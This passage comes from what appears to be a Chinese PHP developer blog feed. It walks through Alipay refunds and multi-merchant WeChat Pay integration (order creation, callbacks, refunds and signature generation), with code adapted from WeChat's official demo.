class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="退款"><a href="#退款" class="headerlink" title="退款"></a>退款</h4><ul><li>支付宝支付退款</li></ul><pre><code class="bash">public <span class="keyword">function</span> refund(<span class="variable">$param</span>){    <span class="variable">$parameter</span> = <span class="variable">$result</span> = [];    try {        <span class="variable">$aop</span> = new AopClient();        <span class="variable">$aop</span>-&gt;gatewayUrl = <span class="string">'https://openapi.alipay.com/gateway.do'</span>;        <span class="variable">$aop</span>-&gt;appId = <span class="variable">$this</span>-&gt;app_id;        <span class="variable">$aop</span>-&gt;rsaPrivateKey = <span class="variable">$this</span>-&gt;rsaPrivateKey;        <span class="variable">$aop</span>-&gt;alipayrsaPublicKey = <span class="variable">$this</span>-&gt;alipayrsaPublicKey;        <span class="variable">$aop</span>-&gt;apiVersion = <span class="string">'1.0'</span>;        <span class="variable">$aop</span>-&gt;signType = <span class="string">'RSA'</span>;        <span class="variable">$aop</span>-&gt;postCharset=<span class="string">'UTF-8'</span>;        <span class="variable">$aop</span>-&gt;format=<span class="string">'json'</span>;        <span class="variable">$parameter</span> = [            <span class="string">"trade_no"</span> =&gt; <span class="variable">$param</span>[<span class="string">'trade_no'</span>],            <span class="string">"out_trade_no"</span> =&gt; <span class="variable">$param</span>[<span class="string">'out_trade_no'</span>],            <span class="string">"out_request_no"</span> =&gt; <span class="variable">$param</span>[<span class="string">'out_request_no'</span>],            <span class="string">"refund_reason"</span> =&gt; <span class="string">'正常退款'</span>,            <span class="string">"refund_amount"</span>=&gt;<span class="variable">$param</span>[<span class="string">'refund_money'</span>],        ];        <span class="variable">$request</span> = new request\AlipayTradeRefundRequest ();        <span class="variable">$request</span>-&gt;setBizContent(json_encode(<span class="variable">$parameter</span>));        <span class="variable">$result</span> = <span class="variable">$aop</span>-&gt;execute (<span class="variable">$request</span>);        <span class="variable">$responseNode</span> = <span class="string">'alipay_trade_refund_response'</span>;//str_replace(<span class="string">"."</span>, <span class="string">"_"</span>, <span class="variable">$request</span>-&gt;getApiMethodName()) . <span class="string">"_response"</span>;        <span class="variable">$data</span> = <span class="variable">$result</span>-&gt;<span class="variable">$responseNode</span>;        <span class="variable">$resultCode</span> = <span class="variable">$data</span>-&gt;code;        <span class="keyword">if</span>(empty(<span class="variable">$resultCode</span>) || <span class="variable">$resultCode</span> != 10000){            <span class="variable">$m</span> = <span class="variable">$data</span>-&gt;sub_msg?<span class="variable">$data</span>-&gt;sub_msg:<span class="variable">$data</span>-&gt;msg;            throw new \Exception(<span class="variable">$m</span>, 1);        }        <span class="variable">$ret</span>[<span class="string">'status'</span>] = <span class="string">'success'</span>;        <span class="variable">$ret</span>[<span class="string">'msg'</span>] = <span class="string">'退款成功'</span>;        <span class="variable">$ret</span>[<span class="string">'data'</span>] = <span class="variable">$data</span>;    } catch (\Exception <span class="variable">$e</span>) {        <span class="variable">$ret</span>[<span class="string">'status'</span>] = <span class="string">'fail'</span>;        <span class="variable">$ret</span>[<span class="string">'msg'</span>] = <span class="variable">$e</span>-&gt;getMessage();    }    writeLog(<span class="string">"| 支付宝退款 | {<span class="variable">$ret</span>['status']}-{<span class="variable">$ret</span>['msg']} | 参数:"</span>.json_encode(<span class="variable">$parameter</span>).<span class="string">" | 结果:"</span>.json_encode(<span class="variable">$result</span>), config(<span class="string">'PAY_LOG'</span>),<span class="string">'refund'</span>);    <span class="built_in">return</span> <span class="variable">$ret</span>;}</code></pre><p>支付宝支付相对比较简单，有什么问题可以联系我喔！</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 支付宝 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php微信多账号支付</title>
      <link href="/php-ailpay.html"/>
      <url>/php-ailpay.html</url>
      <content type="html"><![CDATA[<h2 id="wechat进行app支付"><a href="#wechat进行app支付" class="headerlink" title="wechat进行app支付"></a>wechat进行app支付</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>微信支付的官方<a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1" target="_blank" rel="noopener">服务端demo</a><br>微信的demo藏的比较深</p><p>项目背景，多个商家在同一个平台支付，每个商家都要一个支付的appid(开发者的应用ID)和mch_id(微信支付分配的商户号)<br>商家微信公众平台需要上传当前app的信息(绑定支付的APPID)，审核成功后获取mch_id和key(商户支付密钥,参考开户邮件设置,必须配置,登录商户平台自行设置)<br>app_secret公众帐号secert(仅JSAPI支付的时候需要配置， 登录公众平台，进入开发者中心可设置)</p><p>吐槽下微信的审核周期比较长</p><p>话不多说，开始</p><h3 id="微信支付请求"><a href="#微信支付请求" class="headerlink" title="微信支付请求"></a>微信支付请求</h3><p>微信支付都是xml格式</p><h4 id="起调"><a href="#起调" class="headerlink" title="起调"></a>起调</h4><ul><li>微信支付起调</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">sendRequest</span></span>() &#123;</span><br><span class="line">      <span class="variable">$inputObj</span> = new \WxPayUnifiedOrder();</span><br><span class="line">      //构造业务请求参数的集合(订单信息)</span><br><span class="line">      <span class="variable">$key</span> = <span class="variable">$this</span>-&gt;key;//商户支付密钥</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetAppid(<span class="variable">$this</span>-&gt;appid);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetMch_id(<span class="variable">$this</span>-&gt;mch_id);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetBody(<span class="variable">$this</span>-&gt;body);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetOut_trade_no(<span class="variable">$this</span>-&gt;out_trade_no);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetTotal_fee(<span class="variable">$this</span>-&gt;total_fee);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetSpbill_create_ip(<span class="variable">$this</span>-&gt;spbill_create_ip);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetNotify_url(<span class="variable">$this</span>-&gt;notify_url);</span><br><span class="line">      <span class="variable">$inputObj</span>-&gt;SetTrade_type(<span class="variable">$this</span>-&gt;trade_type);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$api</span> = new \WxDoPay();</span><br><span class="line">//其中有两次签名</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$api</span>-&gt;unifiedOrder(<span class="variable">$inputObj</span>,<span class="variable">$key</span>);    //获取要发送的数据</span><br><span class="line">      <span class="keyword">if</span> (!empty(<span class="variable">$result</span>)&amp;&amp;!empty(<span class="variable">$result</span>[<span class="string">'prepay_id'</span>]))&#123;</span><br><span class="line">          <span class="variable">$singObj</span> = new  \WxPayJsApiPay();</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetAppid(<span class="variable">$result</span>[<span class="string">'appid'</span>]);</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetPartnerid(<span class="variable">$result</span>[<span class="string">'mch_id'</span>]);</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetPrepayid(<span class="variable">$result</span>[<span class="string">'prepay_id'</span>]);</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetPackage(<span class="string">'Sign=WXPay'</span>);</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetNoncestr(<span class="variable">$result</span>[<span class="string">'nonce_str'</span>]);</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetTimestamp(time());</span><br><span class="line">//再次签名</span><br><span class="line">          <span class="variable">$singObj</span>-&gt;SetSign(<span class="variable">$key</span>);</span><br><span class="line">          <span class="variable">$result</span> = <span class="variable">$singObj</span>-&gt;GetValues();</span><br><span class="line">      &#125;</span><br><span class="line">//写日志</span><br><span class="line">      writeLog(<span class="string">"| APP支付 | 参数 | "</span>.json_encode(<span class="variable">$result</span>), config(<span class="string">'PAY_LOG'</span>),<span class="string">'wxpay'</span>);</span><br><span class="line">      <span class="built_in">return</span> json_encode(<span class="variable">$result</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>遇到的坑</li></ul><p>细心点：<br>微信统一支付接口调用有两次签名<br>再起调时<br>要进行三次签名<br>其中签名字段要按照说明文档来<br>起调参数都是小写很容易出错</p><h4 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h4><ul><li>微信支付回调</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   public <span class="keyword">function</span> notifyPay(<span class="variable">$arr</span>=<span class="string">''</span>)&#123;   </span><br><span class="line">//如果返回成功则验证签名</span><br><span class="line">require_once <span class="string">'lib/WxPay.Notify.php'</span>;</span><br><span class="line">//获取通知的数据</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">'key'</span>] = empty(<span class="variable">$arr</span>[<span class="string">'key'</span>])?<span class="variable">$this</span>-&gt;key:<span class="variable">$arr</span>[<span class="string">'key'</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">'appid'</span>] = empty(<span class="variable">$arr</span>[<span class="string">'appid'</span>])?<span class="variable">$this</span>-&gt;appid:<span class="variable">$arr</span>[<span class="string">'appid'</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">'mch_id'</span>] = empty(<span class="variable">$arr</span>[<span class="string">'mch_id'</span>])?<span class="variable">$this</span>-&gt;mch_id:<span class="variable">$arr</span>[<span class="string">'mch_id'</span>];</span><br><span class="line"><span class="variable">$notify</span> = new \WxPayNotify();</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$notify</span>-&gt;Handle(<span class="variable">$arr</span>,<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>遇到的坑</li></ul><p>回调时 用:file_get_contents(‘php://input’)<br>而不用 ：$GLOBALS[‘HTTP_RAW_POST_DATA’]</p><h4 id="退款"><a href="#退款" class="headerlink" title="退款"></a>退款</h4><ul><li>微信支付退款</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   public <span class="keyword">function</span> refund(<span class="variable">$pay_info</span>,<span class="variable">$data</span>)&#123;</span><br><span class="line"><span class="variable">$inputObj</span> = new \WxPayRefund();</span><br><span class="line">// //构造业务请求参数的集合(订单信息)</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetAppid(<span class="variable">$pay_info</span>[<span class="string">'app_id'</span>]);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetMch_id(<span class="variable">$pay_info</span>[<span class="string">'mch_id'</span>]);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetTransaction_id(<span class="variable">$pay_info</span>[<span class="string">'trade_no'</span>]);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetOut_refund_no(<span class="variable">$data</span>[<span class="string">'out_request_no'</span>]);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetTotal_fee(<span class="variable">$pay_info</span>[<span class="string">'money'</span>]*100);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetRefund_fee(<span class="variable">$data</span>[<span class="string">'refund_money'</span>]*100);</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetOp_user_id(<span class="variable">$pay_info</span>[<span class="string">'mch_id'</span>]);</span><br><span class="line"><span class="variable">$api</span> = new \WxDoPay();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$api</span>-&gt;refund(<span class="variable">$inputObj</span>,<span class="variable">$pay_info</span>[<span class="string">'cert_file'</span>],<span class="variable">$pay_info</span>[<span class="string">'key_file'</span>],<span class="variable">$pay_info</span>[<span class="string">'key'</span>],6);  //获取要发送的数据</span><br><span class="line">writeLog(<span class="string">"| 微信退款 | 参数:"</span>.json_encode(<span class="variable">$data</span>).<span class="string">" | 返回值:"</span>.json_encode(<span class="variable">$result</span>), config(<span class="string">'PAY_LOG'</span>),<span class="string">'refund'</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>微信支付中，金额都是以分为单位，注意转化下就可以了</p><h3 id="微信官方demo修改"><a href="#微信官方demo修改" class="headerlink" title="微信官方demo修改"></a>微信官方demo修改</h3><p>demo改动的地方,主要是将参数改成自己引入，重点是key</p><ul><li><p>WxDoPay</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * </span><br><span class="line"> * 统一下单，WxPayUnifiedOrder中out_trade_no、body、total_fee、trade_type必填</span><br><span class="line"> * appid、mchid、spbill_create_ip、nonce_str不需要填入</span><br><span class="line"> * @param WxPayUnifiedOrder <span class="variable">$inputObj</span></span><br><span class="line"> * @param int <span class="variable">$timeOut</span></span><br><span class="line"> * @throws WxPayException</span><br><span class="line"> * @<span class="built_in">return</span> 成功时返回，其他抛异常</span><br><span class="line"> */</span><br><span class="line">public static <span class="keyword">function</span> unifiedOrder(<span class="variable">$inputObj</span>,<span class="variable">$key</span>, <span class="variable">$timeOut</span> = 60)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"https://api.mch.weixin.qq.com/pay/unifiedorder"</span>;</span><br><span class="line">//检测必填参数</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsOut_trade_noSet()) &#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填参数out_trade_no！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsBodySet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填参数body！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsTotal_feeSet()) &#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填参数total_fee！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsTrade_typeSet()) &#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填参数trade_type！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$key</span>))&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填参数key！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">//关联参数</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$inputObj</span>-&gt;GetTrade_type() == <span class="string">"JSAPI"</span> &amp;&amp; !<span class="variable">$inputObj</span>-&gt;IsOpenidSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"统一支付接口中，缺少必填参数openid！trade_type为JSAPI时，openid为必填参数！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$inputObj</span>-&gt;GetTrade_type() == <span class="string">"NATIVE"</span> &amp;&amp; !<span class="variable">$inputObj</span>-&gt;IsProduct_idSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"统一支付接口中，缺少必填参数product_id！trade_type为JSAPI时，product_id为必填参数！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//异步通知url未设置，则使用配置文件中的url</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsNotify_urlSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填异步通知url！"</span>);</span><br><span class="line">// <span class="variable">$inputObj</span>-&gt;SetNotify_url(WxPayConfig::NOTIFY_URL);//异步通知url</span><br><span class="line">&#125;</span><br><span class="line">//商户信息---修改by(hiven)</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsAppidSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填公众账号appid！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsMch_idSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填商户号mch_id！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsSpbill_create_ipSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"缺少统一支付接口必填终端ip！"</span>);</span><br><span class="line">&#125; </span><br><span class="line">//<span class="variable">$inputObj</span>-&gt;SetSpbill_create_ip(<span class="string">"1.1.1.1"</span>);      </span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetNonce_str(self::getNonceStr());//随机字符串</span><br><span class="line"></span><br><span class="line">//签名</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetSign(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$inputObj</span>-&gt;ToXml();</span><br><span class="line"><span class="variable">$startTimeStamp</span> = self::getMillisecond();//请求开始时间</span><br><span class="line"><span class="variable">$response</span> = self::postXmlCurl(<span class="variable">$xml</span>, <span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$timeOut</span>);</span><br><span class="line"><span class="variable">$result</span> = WxPayResults::Init(<span class="variable">$response</span>,<span class="variable">$key</span>);</span><br><span class="line">self::reportCostTime(<span class="variable">$url</span>, <span class="variable">$startTimeStamp</span>, <span class="variable">$result</span>);//上报请求花费时间</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * </span><br><span class="line"> * 查询订单，WxPayOrderQuery中out_trade_no、transaction_id至少填一个</span><br><span class="line"> * appid、mchid、spbill_create_ip、nonce_str不需要填入</span><br><span class="line"> * @param WxPayOrderQuery <span class="variable">$inputObj</span></span><br><span class="line"> * @param int <span class="variable">$timeOut</span></span><br><span class="line"> * @throws WxPayException</span><br><span class="line"> * @<span class="built_in">return</span> 成功时返回，其他抛异常</span><br><span class="line"> */</span><br><span class="line">public static <span class="keyword">function</span> orderQuery(<span class="variable">$inputObj</span>,<span class="variable">$key</span>=<span class="string">''</span>, <span class="variable">$timeOut</span> = 6)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"https://api.mch.weixin.qq.com/pay/orderquery"</span>;</span><br><span class="line">//检测必填参数</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsOut_trade_noSet() &amp;&amp; !<span class="variable">$inputObj</span>-&gt;IsTransaction_idSet()) &#123;</span><br><span class="line">throw new WxPayException(<span class="string">"订单查询接口中，out_trade_no、transaction_id至少填一个！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$inputObj</span>-&gt;IsAppidSet()||!<span class="variable">$inputObj</span>-&gt;IsMch_idSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"订单查询接口中，app_id、mch_id必须存在！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetNonce_str(self::getNonceStr());//随机字符串</span><br><span class="line"></span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetSign(<span class="variable">$key</span>);//签名</span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$inputObj</span>-&gt;ToXml();</span><br><span class="line"><span class="variable">$startTimeStamp</span> = self::getMillisecond();//请求开始时间</span><br><span class="line"><span class="variable">$response</span> = self::postXmlCurl(<span class="variable">$xml</span>, <span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$timeOut</span>);</span><br><span class="line"><span class="variable">$result</span> = WxPayResults::Init(<span class="variable">$response</span>,<span class="variable">$key</span>);</span><br><span class="line">self::reportCostTime(<span class="variable">$url</span>, <span class="variable">$startTimeStamp</span>, <span class="variable">$result</span>);//上报请求花费时间</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * 申请退款，WxPayRefund中out_trade_no、transaction_id至少填一个且</span><br><span class="line"> * out_refund_no、total_fee、refund_fee、op_user_id为必填参数</span><br><span class="line"> * appid、mchid、spbill_create_ip、nonce_str不需要填入</span><br><span class="line"> * @param WxPayRefund <span class="variable">$inputObj</span></span><br><span class="line"> * @param int <span class="variable">$timeOut</span></span><br><span class="line"> * @throws WxPayException</span><br><span class="line"> * @<span class="built_in">return</span> 成功时返回，其他抛异常</span><br><span class="line"> */</span><br><span class="line">public static <span class="keyword">function</span> refund(<span class="variable">$inputObj</span>,<span class="variable">$cert_pem</span>,<span class="variable">$key_pem</span>,<span class="variable">$key</span>, <span class="variable">$timeOut</span> = 6)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"https://api.mch.weixin.qq.com/secapi/pay/refund"</span>;</span><br><span class="line">//检测必填参数</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsOut_trade_noSet() &amp;&amp; !<span class="variable">$inputObj</span>-&gt;IsTransaction_idSet()) &#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，out_trade_no、transaction_id至少填一个！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsOut_refund_noSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数out_refund_no！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsTotal_feeSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数total_fee！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsRefund_feeSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数refund_fee！"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsOp_user_idSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数op_user_id！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsAppidSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数app_id！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$inputObj</span>-&gt;IsMch_idSet())&#123;</span><br><span class="line">throw new WxPayException(<span class="string">"退款申请接口中，缺少必填参数mch_id！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetNonce_str(self::getNonceStr());//随机字符串</span><br><span class="line"><span class="variable">$inputObj</span>-&gt;SetSign(<span class="variable">$key</span>);//签名</span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$inputObj</span>-&gt;ToXml();</span><br><span class="line"><span class="variable">$startTimeStamp</span> = self::getMillisecond();//请求开始时间</span><br><span class="line"><span class="variable">$response</span> = self::postXmlCurl(<span class="variable">$xml</span>, <span class="variable">$url</span>, <span class="literal">true</span>, <span class="variable">$timeOut</span>,<span class="variable">$cert_pem</span>,<span class="variable">$key_pem</span>);</span><br><span class="line"><span class="variable">$result</span> = WxPayResults::Init(<span class="variable">$response</span>,<span class="variable">$key</span>);</span><br><span class="line">self::reportCostTime(<span class="variable">$url</span>, <span class="variable">$startTimeStamp</span>, <span class="variable">$result</span>);//上报请求花费时间</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>生成签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 生成签名</span><br><span class="line"> * @<span class="built_in">return</span> 签名，本函数不覆盖sign成员变量，如要设置签名需要调用SetSign方法赋值</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> MakeSign(<span class="variable">$key</span>=<span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">//签名步骤一：按字典序排序参数</span><br><span class="line">ksort(<span class="variable">$this</span>-&gt;values);</span><br><span class="line"><span class="variable">$string</span> = <span class="variable">$this</span>-&gt;ToUrlParams();</span><br><span class="line">//签名步骤二：在string后加入KEY</span><br><span class="line"><span class="variable">$key</span> = empty(<span class="variable">$key</span>)?WxPayConfig::KEY:<span class="variable">$key</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="variable">$string</span> . <span class="string">"&amp;key="</span>.<span class="variable">$key</span>;</span><br><span class="line">//签名步骤三：MD5加密</span><br><span class="line"><span class="variable">$string</span> = md5(<span class="variable">$string</span>);</span><br><span class="line">//签名步骤四：所有字符转为大写</span><br><span class="line"><span class="variable">$result</span> = strtoupper(<span class="variable">$string</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span 